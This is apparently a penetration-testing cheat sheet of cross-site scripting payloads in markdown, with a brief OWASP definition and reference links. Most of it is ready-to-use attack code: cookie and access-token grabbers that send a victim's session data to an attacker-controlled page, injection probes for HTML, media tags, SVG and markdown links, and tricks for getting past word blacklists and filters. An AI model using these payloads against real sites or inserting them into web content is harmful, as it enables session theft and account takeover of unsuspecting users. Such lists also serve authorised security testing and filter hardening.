# XSS

> Cross-Site Scripting \(XSS\) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user.
>
> Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.
>
> 📖 More information: [https://owasp.org/www-community/attacks/xss/](https://owasp.org/www-community/attacks/xss/)

## Data grabber for XSS

> Obtains the administrator cookie or sensitive access token, the following payload will send it to a controlled page.

```javascript
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
```

```javascript
<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
```

```javascript
<script>new Image().src='http://localhost/cookie.php?c='+document.cookie;</script>
```

```javascript
<script>new Image().src='http://localhost/cookie.php?c='+localStorage.getItem('access_token');</script>
```

## XSS in HTML/Applications

### Basic Payload

```javascript
<script>alert('XSS')</script>
```

```javascript
<scr<script>ipt>alert('XSS')</scr<script>ipt>
```

```javascript
"><script>alert("XSS")</script>
```

```javascript
"><script>alert(String.fromCharCode(88,83,83))</script>
```

### Img tag payload

```markup
<img src=x onerror=alert('XSS');>
```

```markup
<img src=x onerror=alert('XSS')//
```

```markup
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
```

```markup
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
```

```markup
<img src=x:alert(alt) onerror=eval(src) alt=xss>
```

```markup
"><img src=x onerror=alert("XSS");>
```

```markup
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
```

### Video tag payload

```markup
<video autoplay onloadstart="alert('XSS')" src=x></video>
```

```markup
<video autoplay controls onplay="alert('XSS')"><source src="x"></video>
```

```markup
<video controls onloadeddata="alert('XSS')"><source src="x"></video>
```

```markup
<video controls onloadedmetadata="alert('XSS')"><source src="x"></video>
```

```markup
<video controls onloadstart="alert('XSS')"><source src="x"></video>
```

```markup
<video controls oncanplay="alert('XSS')"><source src="x"></video>
```

### Audio tag payload

```markup
<audio autoplay controls onplay="alert('XSS')"><source src="x"></audio>
```

```markup
<audio autoplay controls onplaying="alert('XSS')"><source src="x"></audio>
```

## XSS in Markdown

```text
[a](javascript:prompt(document.cookie))
```

```text
[a](j a v a s c r i p t:prompt(document.cookie))
```

```text
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
```

```text
[a](javascript:window.onerror=alert;throw%201)
```

## XSS in SVG \(short\)

```markup
<svg xmlns='http://www.w3.org/2000/svg' onload='alert(document.domain)'/>
```

```markup
<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
```

```markup
<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
```

```markup
<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
```

## Bypass word blacklist with code evaluation

```javascript
eval('ale'+'rt(0)');
```

```javascript
Function('ale'+'rt(1)')();
```

```javascript
new Function`alert`6``;
```

```javascript
setTimeout('ale'+'rt(2)');
```

```javascript
setInterval('ale'+'rt(10)');
```

```javascript
Set.constructor('ale'+'rt(13)')();
```

```javascript
Set.constructor`alert(14)```;
```

## 📚 References

* [owasp.org/www-community/attacks/xss/](https://owasp.org/www-community/attacks/xss/)
* [github.com/LasCC/Hack-Tools](https://github.com/LasCC/Hack-Tools)
* [netsec.expert/posts/xss-in-2021/](https://netsec.expert/posts/xss-in-2021/)
* [portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
* [owasp.org/www-community/xss-filter-evasion-cheatsheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
* [en.wikipedia.org/wiki/Cross-site\_scripting](https://en.wikipedia.org/wiki/Cross-site_scripting)

